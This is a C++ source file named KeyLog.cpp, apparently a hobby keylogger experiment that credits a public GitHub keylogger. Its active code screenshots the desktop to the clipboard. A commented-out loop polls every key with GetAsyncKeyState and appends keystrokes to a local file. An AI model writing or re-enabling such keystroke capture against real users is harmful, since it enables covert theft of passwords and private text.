// KeyLog.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <ShellScalingApi.h>

using namespace std;
void LOG(string input) 
{
	fstream LogFile;
	LogFile.open("dat.txt", fstream::app);
	if (LogFile.is_open()) 
	{
		LogFile << input;
		LogFile.close();
	}
}
POINT GetDesktopRes()
{
	RECT desktop;
	const HWND hDesktop = GetDesktopWindow();
	GetWindowRect(hDesktop, &desktop);
	POINT ret;
	ret.x = desktop.right;
	ret.y = desktop.bottom;
	cout << "right:" << ret.x << " bottom:" << ret.y;
	return ret;
}
void screenshot(POINT a, POINT b)
{
	// copy screen to bitmap
	HDC     hScreen = GetDC(NULL);
	HDC     hDC = CreateCompatibleDC(hScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, abs(b.x - a.x), abs(b.y - a.y));
	HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
	BOOL    bRet = BitBlt(hDC, 0, 0, abs(b.x - a.x), abs(b.y - a.y), hScreen, a.x, a.y, SRCCOPY);

	// save bitmap to clipboard
	OpenClipboard(NULL);
	EmptyClipboard();
	SetClipboardData(CF_BITMAP, hBitmap);
	CloseClipboard();

	// clean up
	SelectObject(hDC, old_obj);
	DeleteDC(hDC);
	ReleaseDC(NULL, hScreen);
	DeleteObject(hBitmap);
}
bool SpecialKeys(int S_Key) 
{
	switch (S_Key) {
	case VK_SPACE:
		std::cout << " ";
		return true;
	case VK_RETURN:
		std::cout << "\n";
		return true;
	case '¾':
		cout << ".";
		return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		return true;
	case VK_BACK:
		cout << "\b";
		return true;
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		return true;
	default:
		return false;
	}
}

//https://github.com/EgeBalci/Keylogger/blob/master/Source.cpp
int main()
{
	ShowWindow(GetConsoleWindow(), SW_SHOW);
	char KEY = 'x';

	/*while (true) 
	{
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) 
			{
				if (SpecialKeys(KEY) == false) 
				{
					fstream LogFile;
					LogFile.open("dat.txt", fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}
					
				}

			}
		}
	}*/
	POINT a, b;
	a.x = 0;
	a.y = 0;
		
	b = GetDesktopRes();
	//b.x = 1920;
	//b.y = 1080;

	screenshot(a, b);
	
	system("pause");
	return 0;
}
